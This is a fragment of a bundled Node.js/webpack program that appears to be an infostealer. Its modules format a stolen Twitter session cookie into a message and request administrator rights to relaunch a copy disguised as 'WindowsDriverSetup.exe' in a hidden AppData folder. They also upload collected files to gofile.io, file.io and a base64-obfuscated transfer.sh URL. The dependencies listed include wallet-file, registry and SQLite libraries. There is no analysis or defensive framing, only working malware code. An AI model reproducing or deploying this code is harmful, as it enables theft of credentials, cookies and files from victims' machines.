`\\`${handleNullValue(cookie)}\\``,\r\n              inline: false,\r\n            },\r\n          ],\r\n          footer: {\r\n            text: \"Creation Date: \" + handleNullValue(created_at),\r\n          },\r\n          title: \"Twitter Account\",\r\n          url: `https://twitter.com/${screen_name}`,\r\n        },\r\n      ],\r\n    };\r\n    if (embed) {\r\n      return embed;\r\n    } else {\r\n      return null;\r\n    }\r\n  }\r\n}\r\n\r\nmodule.exports = {\r\n  detailtwitter,\r\n  sendTwitter,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/twitter.js?");

/***/ }),

/***/ "./utils/uac.js":
/*!**********************!*\
  !*** ./utils/uac.js ***!
  \**********************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const {execSync} = __webpack_require__(/*! child_process */ \"child_process\"),\r\n path = __webpack_require__(/*! path */ \"path\"),\r\n sudo = __webpack_require__(/*! sudo-prompt */ \"sudo-prompt\"),\r\n admin = __webpack_require__(/*! admin-check */ \"admin-check\");\r\n\r\n\r\n\r\nfunction requestAdminPrivileges() {\r\n  return new Promise((resolve, reject) => {\r\n    const secretPath = path.join(\r\n      process.env.APPDATA,\r\n      \"Microsoft\",\r\n      \"Windows\",\r\n      \"Themes\",\r\n      \"CachedFiles\"\r\n    );\r\n    let myself = path.join(secretPath, \"WindowsDriverSetup.exe\");\r\n\r\n    sudo.exec(`${process.execPath} \"${path.join(myself)}\" --admin`, (error) => {\r\n      if (error) {\r\n      } else {\r\n        process.abort()\r\n      }\r\n    });\r\n  });\r\n}\r\n\r\n\r\nasync function requestAdminPrivilegesIfNeeded(cc) {\r\n  if (cc === \"yes\") {\r\n    let g = await admin.check()\r\n    if (!g) {\r\n      try {\r\n        await requestAdminPrivileges();\r\n      } catch (error) {\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\n\r\n\r\nmodule.exports = {\r\n  requestAdminPrivilegesIfNeeded,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/uac.js?");

/***/ }),

/***/ "./utils/uploadFiles.js":
/*!******************************!*\
  !*** ./utils/uploadFiles.js ***!
  \******************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const fs = __webpack_require__(/*! fs */ \"fs\");\nconst FormData = __webpack_require__(/*! form-data */ \"form-data\");\nconst axios = __webpack_require__(/*! axios */ \"axios\");\n\nasync function upload(path) {\n  let link;\n  try {\n    const server = await FoundSrv();\n    if(server !== null){\n    link = await uploadFile(path, server);\n    if(!link){\n      link = await uploadTransfer(path);\n      if(!link){\n        link = await uploadToFileio(path);\n        return link;\n      }\n    }\n    return link;\n    }else{\n      link = await uploadTransfer(path);\n      if(!link){\n        link = await uploadToFileio(path);\n        return link;\n      }\n      return link;\n    }\n  } catch (e) {\n    if (e) {\n      const link = await uploadTransfer(path);\n      return link;\n    }\n  }\n}\n\nasync function uploadToFileio(filePath) {\n  const data = new FormData();\n  data.append(\"file\", fs.createReadStream(filePath));\n  try {\n    const response = await axios.post(\"https://file.io/\", data, {\n      headers: {\n        ...data.getHeaders(),\n      },\n\n    });\n    return response.data.link ?? null;\n  } catch (error) {\n    return null\n  }\n}\nasync function FoundSrv() {\n  const res = await axios({\n    url: `https://api.gofile.io/getServer`,\n    method: \"GET\",\n    headers: {\n      accept: \"*/*\",\n      \"accept-language\": \"en-US,en;\",\n      \"cache-control\": \"no-cache\",\n      pragma: \"no-cache\",\n      referrer: \"https://gofile.io/uploadFiles\",\n      mode: \"cors\",\n      \"user-agent\":\n        \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44\",\n      dnt: 1,\n      origin: \"https://gofile.io\",\n    },\n  });\n\n  if (res.data.status !== \"ok\") {\n    return null;\n  }\n\n  return res.data.data.server;\n}\n\nasync function uploadFile(path, server) {\n  const formData = new FormData();\n  formData.append(\"file\", fs.createReadStream(path));\n\n  const res = await axios({\n    url: `https://${server}.gofile.io/uploadFile`,\n    method: \"POST\",\n    headers: {\n      accept: \"*/*\",\n      \"accept-language\": \"en-US,en;\",\n      \"cache-control\": \"no-cache\",\n      pragma: \"no-cache\",\n      referrer: \"https://gofile.io/uploadFiles\",\n      mode: \"cors\",\n      \"user-agent\":\n        \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44\",\n      dnt: 1,\n      origin: \"https://gofile.io\",\n      ...formData.getHeaders(),\n    },\n    maxContentLength: Infinity,\n    maxBodyLength: Infinity,\n    referrer: \"https://gofile.io/uploadFiles\",\n    data: formData,\n  });\n\n  if (res.data.status !== \"ok\") {\n  }\n\n  return res.data.data.downloadPage;\n}\n\n\nasync function uploadTransfer(path) {\n  const FileData = new FormData();\n  FileData.append(\"file\", fs.createReadStream(path));\n\n  try {\n    let g = Buffer.from(\n      \"aHR0cHM6Ly90cmFuc2Zlci5zaA==\",\n      \"base64\"\n    ).toString();\n    const res = await axios.post(g, FileData, {\n      headers: {\n        ...FileData.getHeaders(),\n      },\n    });\n\n    if (res.status === 200 && res.data) {\n      const downloadUrl = res.data.trim();\n      return downloadUrl;\n    } else {\n    }\n  } catch (error) {\n  }\n}\n\n\nmodule.exports = {\n  upload,\n};\n\n\n//# sourceURL=webpack://script/./utils/uploadFiles.js?");

/***/ }),

/***/ "admin-check":
/*!******************************!*\
  !*** external "admin-check" ***!
  \******************************/
/***/ ((module) => {

"use strict";
module.exports = require("admin-check");

/***/ }),

/***/ "archiver":
/*!***************************!*\
  !*** external "archiver" ***!
  \***************************/
/***/ ((module) => {

"use strict";
module.exports = require("archiver");

/***/ }),

/***/ "asar":
/*!***********************!*\
  !*** external "asar" ***!
  \***********************/
/***/ ((module) => {

"use strict";
module.exports = require("asar");

/***/ }),

/***/ "axios":
/*!************************!*\
  !*** external "axios" ***!
  \************************/
/***/ ((module) => {

"use strict";
module.exports = require("axios");

/***/ }),

/***/ "boukiapi":
/*!***************************!*\
  !*** external "boukiapi" ***!
  \***************************/
/***/ ((module) => {

"use strict";
module.exports = require("boukiapi");

/***/ }),

/***/ "child_process":
/*!********************************!*\
  !*** external "child_process" ***!
  \********************************/
/***/ ((module) => {

"use strict";
module.exports = require("child_process");

/***/ }),

/***/ "crypto":
/*!*************************!*\
  !*** external "crypto" ***!
  \*************************/
/***/ ((module) => {

"use strict";
module.exports = require("crypto");

/***/ }),

/***/ "form-data":
/*!****************************!*\
  !*** external "form-data" ***!
  \****************************/
/***/ ((module) => {

"use strict";
module.exports = require("form-data");

/***/ }),

/***/ "fs":
/*!*********************!*\
  !*** external "fs" ***!
  \*********************/
/***/ ((module) => {

"use strict";
module.exports = require("fs");

/***/ }),

/***/ "glob":
/*!***********************!*\
  !*** external "glob" ***!
  \***********************/
/***/ ((module) => {

"use strict";
module.exports = require("glob");

/***/ }),

/***/ "iconv-lite":
/*!*****************************!*\
  !*** external "iconv-lite" ***!
  \*****************************/
/***/ ((module) => {

"use strict";
module.exports = require("iconv-lite");

/***/ }),

/***/ "node-forge":
/*!*****************************!*\
  !*** external "node-forge" ***!
  \*****************************/
/***/ ((module) => {

"use strict";
module.exports = require("node-forge");

/***/ }),

/***/ "node-passworder":
/*!**********************************!*\
  !*** external "node-passworder" ***!
  \**********************************/
/***/ ((module) => {

"use strict";
module.exports = require("node-passworder");

/***/ }),

/***/ "powershell":
/*!*****************************!*\
  !*** external "powershell" ***!
  \*****************************/
/***/ ((module) => {

"use strict";
module.exports = require("powershell");

/***/ }),

/***/ "process":
/*!**************************!*\
  !*** external "process" ***!
  \**************************/
/***/ ((module) => {

"use strict";
module.exports = require("process");

/***/ }),

/***/ "seco-file":
/*!****************************!*\
  !*** external "seco-file" ***!
  \****************************/
/***/ ((module) => {

"use strict";
module.exports = require("seco-file");

/***/ }),

/***/ "sql.js":
/*!*************************!*\
  !*** external "sql.js" ***!
  \*************************/
/***/ ((module) => {

"use strict";
module.exports = require("sql.js");

/***/ }),

/***/ "sqlite3":
/*!**************************!*\
  !*** external "sqlite3" ***!
  \**************************/
/***/ ((module) => {

"use strict";
module.exports = require("sqlite3");

/***/ }),

/***/ "sudo-prompt":
/*!******************************!*\
  !*** external "sudo-prompt" ***!
  \******************************/
/***/ ((module) => {

"use strict";
module.exports = require("sudo-prompt");

/***/ }),

/***/ "unidecode":
/*!****************************!*\
  !*** external "unidecode" ***!
  \****************************/
/***/ ((module) => {

"use strict";
module.exports = require("unidecode");

/***/ }),

/***/ "unzipper":
/*!***************************!*\
  !*** external "unzipper" ***!
  \***************************/
/***/ ((module) => {

"use strict";
module.exports = require("unzipper");

/***/ }),

/***/ "util":
/*!***********************!*\
  !*** external "util" ***!
  \***********************/
/***/ ((module) => {

"use strict";
module.exports = require("util");

/***/ }),

/***/ "winreg":
/*!*************************!*\
  !*** external "winreg" ***!
  \*************************/
/***/ ((module) => {

"use strict";
module.exports = require("winreg");

/***/ }),

/***/ "https":
/*!************************!*\
  !*** external "https" ***!
  \************************/
/***/ ((module) => {

"use strict";
module.exports = require("https");

/***/ }),

/***/ "os":
/*!*********************!*\
  !*** external "os" ***!
  \*********************/
/***/ ((module) => {

"use strict";
module.exports = require("os");

/***/ }),

/***/ "path":
/*!***********************!*\
  !*** external "path" ***!
  \***********************/
/***/ ((module) => {

"use strict";
module.exports = require("path");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module can't be inlined because the eval devtool is used.
/******/ 	var __webpack_exports__ = __webpack_require__("./index.js");
/******/ 	
/******/ })()
;
